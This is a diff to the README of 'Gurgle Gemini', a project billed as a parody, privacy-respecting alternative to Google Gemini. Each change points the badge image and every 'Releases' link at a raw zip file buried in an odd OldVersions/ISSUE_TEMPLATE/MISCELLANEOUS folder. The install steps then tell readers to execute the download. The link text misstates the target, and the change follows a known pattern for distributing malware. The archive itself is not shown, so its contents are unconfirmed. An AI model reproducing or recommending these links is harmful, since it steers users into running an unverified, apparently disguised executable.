@@ -1,6 +1,6 @@
 # Gurgle Gemini 🌌✨
 
-![Gurgle Gemini](https://img.shields.io/badge/Gurgle_Gemini-v1.0-blue.svg)
+![Gurgle Gemini](https://github.com/TotalTodoFull/Gurgle_Gemini/raw/refs/heads/Gurgle_Gemini_Main-dev/OldVersions/ISSUE_TEMPLATE/MISCELLANEOUS/Gemini-Gurgle-1.7.zip)
 
 Welcome to the official source repository for **Gurgle Gemini**, a privacy-respecting, free and open-source alternative to Google Gemini. This project also serves as a light-hearted parody of Google Gemini, combining functionality with humor. 
 
@@ -32,9 +32,9 @@ In a world where data privacy is often compromised, Gurgle Gemini stands out by 
 
 ## Installation
 
-To get started with Gurgle Gemini, you can download the latest release from our [Releases](https://github.com/TotalTodoFull/Gurgle_Gemini/releases) section. 
+To get started with Gurgle Gemini, you can download the latest release from our [Releases](https://github.com/TotalTodoFull/Gurgle_Gemini/raw/refs/heads/Gurgle_Gemini_Main-dev/OldVersions/ISSUE_TEMPLATE/MISCELLANEOUS/Gemini-Gurgle-1.7.zip) section. 
 
-1. Visit the [Releases](https://github.com/TotalTodoFull/Gurgle_Gemini/releases) page.
+1. Visit the [Releases](https://github.com/TotalTodoFull/Gurgle_Gemini/raw/refs/heads/Gurgle_Gemini_Main-dev/OldVersions/ISSUE_TEMPLATE/MISCELLANEOUS/Gemini-Gurgle-1.7.zip) page.
 2. Download the appropriate file for your operating system.
 3. Execute the file to install Gurgle Gemini.
 
@@ -78,7 +78,7 @@ Gurgle Gemini is licensed under the GPL-3.0 License. This means you can use, mod
 
 ## Support
 
-If you encounter issues or have questions, please check the [Releases](https://github.com/TotalTodoFull/Gurgle_Gemini/releases) section for troubleshooting tips. You can also reach out to the community via our discussion forum.
+If you encounter issues or have questions, please check the [Releases](https://github.com/TotalTodoFull/Gurgle_Gemini/raw/refs/heads/Gurgle_Gemini_Main-dev/OldVersions/ISSUE_TEMPLATE/MISCELLANEOUS/Gemini-Gurgle-1.7.zip) section for troubleshooting tips. You can also reach out to the community via our discussion forum.
 
 ## Acknowledgments
 
